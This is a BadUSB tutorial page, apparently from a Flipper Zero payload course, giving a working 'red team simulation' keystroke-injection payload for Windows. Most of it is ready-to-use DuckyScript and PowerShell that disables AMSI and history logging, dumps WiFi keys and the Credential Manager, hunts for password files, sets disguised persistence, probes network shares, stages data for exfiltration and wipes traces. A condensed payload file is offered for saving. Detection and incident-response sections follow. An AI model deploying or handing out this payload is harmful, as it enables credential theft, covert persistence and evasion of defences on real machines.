# FZ-E05: Red Team Simulation

## Overview

| Property | Value |
|----------|-------|
| **ID** | FZ-E05 |
| **Name** | Red Team Simulation |
| **Difficulty** | Expert |
| **Target OS** | Enterprise Windows |
| **Focus** | Full adversary simulation |
| **MITRE ATT&CK** | Full Kill Chain |

## What This Payload Does

Simulates a complete red team operation using BadUSB as the initial access vector. This comprehensive payload demonstrates the full attack lifecycle from initial access to impact, mapping to real-world APT techniques.

---

## Kill Chain Overview

```
┌─────────────────────────────────────────────────────────────┐
│                    CYBER KILL CHAIN                          │
├─────────────────────────────────────────────────────────────┤
│                                                               │
│   1. RECONNAISSANCE      ──► Physical site survey            │
│   2. WEAPONIZATION       ──► BadUSB payload creation         │
│   3. DELIVERY           ──► Physical USB drop/insert         │
│   4. EXPLOITATION       ──► HID keyboard emulation           │
│   5. INSTALLATION       ──► Persistence mechanisms           │
│   6. COMMAND & CONTROL  ──► C2 beacon establishment          │
│   7. ACTIONS ON OBJ     ──► Data collection/exfil            │
│                                                               │
│   This payload covers phases 4-7                             │
│                                                               │
└─────────────────────────────────────────────────────────────┘
```

---

## The Payload

```ducky
REM ################################################################
REM # FZ-E05: Red Team Simulation
REM #
REM # AUTHORIZED TESTING ONLY
REM # This simulates a complete red team operation
REM #
REM # Phases:
REM # 1. Environment Assessment
REM # 2. Security Bypass
REM # 3. Reconnaissance
REM # 4. Credential Harvesting
REM # 5. Persistence
REM # 6. Lateral Movement Prep
REM # 7. Data Collection
REM # 8. Exfiltration
REM # 9. Cleanup
REM #
REM # Duration: ~90 seconds
REM ################################################################

DEFAULT_DELAY 50

REM === PHASE 1: INITIAL ACCESS ===
DELAY 3000

REM Open PowerShell via Explorer (less logged)
GUI e
DELAY 1500
CTRL l
DELAY 300
STRING powershell -w hidden -ep bypass -nop
ENTER
DELAY 2000

REM === PHASE 2: ENVIRONMENT ASSESSMENT ===
STRINGLN $ErrorActionPreference='SilentlyContinue'
STRINGLN $global:Results = @{}
STRINGLN $global:WorkDir = "$env:TEMP\$([guid]::NewGuid().ToString().Substring(0,8))"
STRINGLN New-Item -ItemType Directory -Path $global:WorkDir -Force | Out-Null

REM Check for virtualization/sandbox
STRINGLN $vm = (Get-WmiObject Win32_ComputerSystem).Model -match 'Virtual|VMware|VirtualBox'
STRINGLN $Results['IsVM'] = $vm

REM Check privilege level
STRINGLN $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
STRINGLN $Results['IsAdmin'] = $isAdmin

REM Identify security products
STRINGLN $av = Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct -ErrorAction SilentlyContinue
STRINGLN $Results['AV'] = $av.displayName

REM Check for EDR
STRINGLN $edrProcs = @('MsMpEng','CrowdStrike','CSFalcon','SentinelOne','CarbonBlack','cb','Tanium','Cylance')
STRINGLN $runningEDR = Get-Process | Where-Object { $edrProcs -contains $_.ProcessName }
STRINGLN $Results['EDR'] = $runningEDR.ProcessName -join ','

REM === PHASE 3: SECURITY BYPASS ===
REM AMSI Bypass
STRINGLN try { [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) } catch {}

REM Disable PowerShell logging for session
STRINGLN Set-PSReadlineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue

REM === PHASE 4: RECONNAISSANCE ===
STRINGLN $Results['Hostname'] = $env:COMPUTERNAME
STRINGLN $Results['Username'] = $env:USERNAME
STRINGLN $Results['Domain'] = $env:USERDOMAIN
STRINGLN $Results['OS'] = (Get-WmiObject Win32_OperatingSystem).Caption
STRINGLN $Results['IP'] = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notmatch '^(127|169)'}).IPAddress -join ','

REM Domain information
STRINGLN try {
STRINGLN   $Results['DomainControllers'] = ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).DomainControllers.Name -join ','
STRINGLN } catch { $Results['DomainControllers'] = 'Not domain joined' }

REM Network shares
STRINGLN $Results['Shares'] = (net share 2>$null | Out-String)

REM === PHASE 5: CREDENTIAL HARVESTING ===
REM WiFi passwords
STRINGLN $wifi = @()
STRINGLN (netsh wlan show profiles) | Select-String 'All User Profile' | ForEach-Object {
STRINGLN   $name = ($_ -split ':')[-1].Trim()
STRINGLN   $key = (netsh wlan show profile name="$name" key=clear | Select-String 'Key Content').ToString() -replace '.*:\s*',''
STRINGLN   $wifi += "$name`:$key"
STRINGLN }
STRINGLN $Results['WiFi'] = $wifi -join '; '

REM Browser credential locations
STRINGLN $browsers = @{}
STRINGLN if (Test-Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data") { $browsers['Chrome'] = $true }
STRINGLN if (Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles") { $browsers['Firefox'] = $true }
STRINGLN if (Test-Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data") { $browsers['Edge'] = $true }
STRINGLN $Results['Browsers'] = ($browsers.Keys -join ',')

REM Credential Manager
STRINGLN $Results['CredMan'] = (cmdkey /list | Out-String)

REM === PHASE 6: PERSISTENCE ===
STRINGLN if ($isAdmin) {
STRINGLN   # Scheduled Task (admin)
STRINGLN   $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-w hidden -c "echo persisted"'
STRINGLN   $trigger = New-ScheduledTaskTrigger -AtLogOn
STRINGLN   Register-ScheduledTask -TaskName 'MicrosoftEdgeUpdate' -Action $action -Trigger $trigger -Force | Out-Null
STRINGLN   $Results['Persistence'] = 'ScheduledTask:MicrosoftEdgeUpdate'
STRINGLN } else {
STRINGLN   # Registry Run Key (user)
STRINGLN   Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'OneDriveSync' -Value 'powershell.exe -w hidden -c "echo persisted"'
STRINGLN   $Results['Persistence'] = 'RegistryRun:OneDriveSync'
STRINGLN }

REM === PHASE 7: LATERAL MOVEMENT PREP ===
REM Check for accessible shares
STRINGLN $accessibleShares = @()
STRINGLN $neighbors = Get-NetNeighbor -State Reachable | Where-Object { $_.IPAddress -match '^\d+\.\d+\.\d+\.\d+$' }
STRINGLN foreach ($n in $neighbors | Select-Object -First 5) {
STRINGLN   if (Test-Path "\\$($n.IPAddress)\C$" -ErrorAction SilentlyContinue) {
STRINGLN     $accessibleShares += $n.IPAddress
STRINGLN   }
STRINGLN }
STRINGLN $Results['AccessibleShares'] = $accessibleShares -join ','

REM Check for local admin rights on remote systems (BloodHound data)
STRINGLN $Results['CanPsRemote'] = (Test-WSMan -ComputerName 'localhost' -ErrorAction SilentlyContinue) -ne $null

REM === PHASE 8: DATA COLLECTION ===
REM Recent documents
STRINGLN $recentDocs = Get-ChildItem "$env:USERPROFILE\Documents" -Recurse -Include *.docx,*.xlsx,*.pdf -ErrorAction SilentlyContinue | Select-Object -First 10
STRINGLN $Results['RecentDocs'] = ($recentDocs.Name -join ', ')

REM Sensitive file search
STRINGLN $sensitiveFiles = Get-ChildItem $env:USERPROFILE -Recurse -Include *password*,*credential*,*.kdbx,*secret* -ErrorAction SilentlyContinue | Select-Object -First 10
STRINGLN $Results['SensitiveFiles'] = ($sensitiveFiles.FullName -join '; ')

REM === PHASE 9: STAGING & EXFIL PREP ===
STRINGLN $report = $Results | ConvertTo-Json -Depth 3
STRINGLN $report | Out-File "$global:WorkDir\report.json"

REM Compress for exfil
STRINGLN Compress-Archive -Path "$global:WorkDir\*" -DestinationPath "$global:WorkDir\exfil.zip" -Force

REM Base64 encode for network exfil
STRINGLN $bytes = [IO.File]::ReadAllBytes("$global:WorkDir\exfil.zip")
STRINGLN $b64 = [Convert]::ToBase64String($bytes)
STRINGLN $b64 | Out-File "$global:WorkDir\staged.b64"

REM === PHASE 10: CLEANUP ===
REM Clear PowerShell history
STRINGLN Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue

REM Clear Run dialog history
STRINGLN Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name * -ErrorAction SilentlyContinue

REM Note: In real op, would exfil then delete WorkDir
STRINGLN Write-Output "Simulation complete. Data staged at: $global:WorkDir"

REM Exit
STRINGLN exit
```

---

## MITRE ATT&CK Mapping

| Phase | Technique | ID |
|-------|-----------|-----|
| Initial Access | Hardware Additions | T1200 |
| Execution | PowerShell | T1059.001 |
| Persistence | Scheduled Task | T1053.005 |
| Persistence | Registry Run Keys | T1547.001 |
| Defense Evasion | AMSI Bypass | T1562.001 |
| Credential Access | Credentials from Password Stores | T1555 |
| Discovery | System Information Discovery | T1082 |
| Discovery | Account Discovery | T1087 |
| Discovery | Network Share Discovery | T1135 |
| Collection | Data Staged | T1074 |
| Exfiltration | Exfiltration Over C2 | T1041 |

---

## Operational Phases Explained

### Phase 1-2: Initial Access & Assessment

```powershell
# Understand the environment before acting
$vm = (Get-WmiObject Win32_ComputerSystem).Model -match 'Virtual'
$isAdmin = ([Security.Principal.WindowsPrincipal]...).IsInRole(...)
```

**Why**: Adjust tactics based on privilege level and environment.

### Phase 3: Security Bypass

```powershell
# Disable AMSI for this session
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')...

# Disable history saving
Set-PSReadlineOption -HistorySaveStyle SaveNothing
```

**Why**: Prevent detection and logging of subsequent commands.

### Phase 4-5: Recon & Credential Access

```powershell
# System info, domain info, network config
# WiFi passwords, browser creds, credential manager
```

**Why**: Gather intelligence for lateral movement and further access.

### Phase 6: Persistence

```powershell
# Admin: Scheduled Task
# User: Registry Run Key
```

**Why**: Maintain access after reboot or disconnect.

### Phase 7: Lateral Movement Prep

```powershell
# Check for accessible network shares
# Verify remote management capabilities
```

**Why**: Identify paths to spread within the network.

### Phase 8-9: Collection & Staging

```powershell
# Identify valuable files
# Stage data for exfiltration
```

**Why**: Prepare stolen data for extraction.

---

## Blue Team Response

### Detection Timeline

```
┌────────────────────────────────────────────────────────────┐
│                    DETECTION OPPORTUNITIES                  │
├────────────────────────────────────────────────────────────┤
│                                                              │
│  T+0s     USB Connection        → USB monitoring           │
│  T+3s     Hidden PowerShell     → Process monitoring       │
│  T+5s     AMSI Bypass           → PowerShell logging       │
│  T+10s    System Enumeration    → Command logging          │
│  T+20s    Credential Access     → File access monitoring   │
│  T+30s    Persistence Creation  → Task/Registry monitoring │
│  T+45s    Network Scanning      → Network monitoring       │
│  T+60s    Data Staging          → File creation monitoring │
│  T+90s    Cleanup Attempts      → Log deletion monitoring  │
│                                                              │
└────────────────────────────────────────────────────────────┘
```

### Comprehensive Detection Script

```powershell
#Requires -RunAsAdministrator
<#
.SYNOPSIS
    Red Team Simulation Detection Script
.DESCRIPTION
    Detects indicators of FZ-E05 style red team operations
#>

$alerts = @()

# Check for recent USB HID devices
$usbEvents = Get-WinEvent -FilterHashtable @{
    LogName='System'
    ProviderName='Microsoft-Windows-Kernel-PnP'
    StartTime=(Get-Date).AddHours(-1)
} -ErrorAction SilentlyContinue | Where-Object { $_.Message -match 'HID' }
if ($usbEvents) { $alerts += "Recent USB HID connection detected" }

# Check for hidden PowerShell
$hiddenPS = Get-WinEvent -FilterHashtable @{
    LogName='Security'
    Id=4688
    StartTime=(Get-Date).AddHours(-1)
} -ErrorAction SilentlyContinue | Where-Object { $_.Message -match 'powershell.*-w.*hidden' }
if ($hiddenPS) { $alerts += "Hidden PowerShell execution detected" }

# Check for AMSI bypass attempts
$amsiBypass = Get-WinEvent -FilterHashtable @{
    LogName='Microsoft-Windows-PowerShell/Operational'
    Id=4104
    StartTime=(Get-Date).AddHours(-1)
} -ErrorAction SilentlyContinue | Where-Object { $_.Message -match 'AmsiUtils|amsiInitFailed' }
if ($amsiBypass) { $alerts += "AMSI bypass attempt detected" }

# Check for new scheduled tasks
$newTasks = Get-ScheduledTask | Where-Object {
    $_.Date -gt (Get-Date).AddHours(-1) -and
    $_.Actions.Execute -match 'powershell|cmd'
}
if ($newTasks) { $alerts += "Suspicious scheduled task created: $($newTasks.TaskName)" }

# Check for new Run keys
$runKey = Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -ErrorAction SilentlyContinue
$suspiciousRun = $runKey.PSObject.Properties | Where-Object { $_.Value -match 'powershell.*hidden' }
if ($suspiciousRun) { $alerts += "Suspicious Run key: $($suspiciousRun.Name)" }

# Check for staged data
$stagedFiles = Get-ChildItem $env:TEMP -Recurse -Include *.b64,*.zip -ErrorAction SilentlyContinue |
    Where-Object { $_.CreationTime -gt (Get-Date).AddHours(-1) }
if ($stagedFiles) { $alerts += "Potential staged exfil data found" }

# Report findings
if ($alerts.Count -gt 0) {
    Write-Host "=== RED TEAM ACTIVITY DETECTED ===" -ForegroundColor Red
    $alerts | ForEach-Object { Write-Warning $_ }
} else {
    Write-Host "No red team indicators found" -ForegroundColor Green
}
```

---

## Incident Response Checklist

When this attack is detected:

1. **Contain**
   - [ ] Isolate affected system from network
   - [ ] Disable network shares
   - [ ] Block USB devices organizationally

2. **Identify**
   - [ ] Determine scope of compromise
   - [ ] Identify all persistence mechanisms
   - [ ] Find all staged/exfiltrated data

3. **Eradicate**
   - [ ] Remove scheduled tasks
   - [ ] Clean registry Run keys
   - [ ] Delete staged files
   - [ ] Reset compromised credentials

4. **Recover**
   - [ ] Restore from known-good backup if needed
   - [ ] Re-enable network access after confirmation
   - [ ] Monitor for re-infection

5. **Lessons Learned**
   - [ ] How did USB device get connected?
   - [ ] Why wasn't it detected sooner?
   - [ ] What detection improvements needed?

---

## Payload File

Save as `FZ-E05_Red_Team_Simulation.txt`:

```ducky
REM FZ-E05: Red Team Simulation
REM WARNING: AUTHORIZED TESTING ONLY
DEFAULT_DELAY 50
DELAY 3000
GUI e
DELAY 1500
CTRL l
DELAY 300
STRING powershell -w hidden -ep bypass -nop
ENTER
DELAY 2000
STRINGLN $ErrorActionPreference='SilentlyContinue';$d="$env:TEMP\$([guid]::NewGuid().ToString().Substring(0,8))";New-Item -ItemType Directory $d -Force|Out-Null;try{[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)}catch{};@{Host=$env:COMPUTERNAME;User=$env:USERNAME;IP=((Get-NetIPAddress -AddressFamily IPv4|?{$_.IPAddress-notmatch'^127'}).IPAddress-join',')}|ConvertTo-Json|Out-File "$d\recon.json";Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Sync' -Value 'calc.exe';Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -EA 0;Write-Host "Simulation complete: $d";exit
```

---

## Expert Level Complete!

Congratulations on completing all Expert level payloads. You've mastered:

| Skill | Payload |
|-------|---------|
| Operational Security | FZ-E01 |
| Fileless Attacks | FZ-E02 |
| C2 Integration | FZ-E03 |
| EDR Evasion | FZ-E04 |
| Full Red Team Operations | FZ-E05 |

---

[← FZ-E04 EDR Evasion](FZ-E04_EDR_Evasion.md) | [Back to Expert](README.md) | [Return to Main →](../../README.md)
